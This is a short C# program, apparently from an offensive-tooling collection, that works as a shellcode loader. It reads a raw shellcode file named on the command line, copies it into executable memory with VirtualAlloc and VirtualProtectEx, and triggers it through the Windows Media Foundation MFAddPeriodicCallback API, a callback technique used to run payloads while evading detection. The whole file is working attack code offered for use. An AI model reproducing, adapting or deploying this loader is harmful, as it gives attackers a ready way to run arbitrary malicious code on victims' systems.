// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MFAddPeriodicCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: MFAddPeriodicCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            MFStartup(0x0002 << 16 | 0x0070, 0x1);

            uint dwKey = 0;
            MFAddPeriodicCallback(hAlloc, IntPtr.Zero, out dwKey);

            System.Threading.Thread.Sleep(1000);

            MFShutdown();

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFStartup(
        ulong Version,
        uint dwFlags);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFAddPeriodicCallback(
            IntPtr Callback,
            IntPtr pContext,
            out uint dwKey);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern IntPtr MFShutdown();

    }
}
